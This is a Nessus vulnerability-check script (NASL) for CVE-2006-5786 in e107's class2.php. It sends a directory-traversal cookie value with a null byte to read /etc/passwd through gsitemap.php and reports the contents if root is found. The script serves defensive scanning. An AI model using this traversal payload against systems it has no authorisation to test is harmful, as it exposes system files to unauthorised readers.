#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(23624);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-5786");
  script_bugtraq_id(20913);
  script_xref(name:"OSVDB", value:"33920");

  script_name(english:"e107 class2.php e107language_e107cookie Cookie Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file with e107");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue." );
 script_set_attribute(attribute:"description", value:
"The 'class2.php' script included with the version of e107 installed on
the remote host contains a programming flaw that manipulation through
a cookie variable the 'e_LANGUAGE' variable, which is used in PHP
'include_once()' functions.  Regardless of PHP's settings, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2711" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  file = "../../../../../../../../../../../etc/passwd%00";
  set_http_cookie(name: 'e107language_e107cookie', value: file);
  r = http_send_recv3(method: 'GET', item:string(dir, "/gsitemap.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string: r[2]))
  {
    contents = r[2] - strstr(r[2], "<?xml version");
    report = string(
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );
    security_hole(port:port, extra:report);
    exit(0);
  }
}
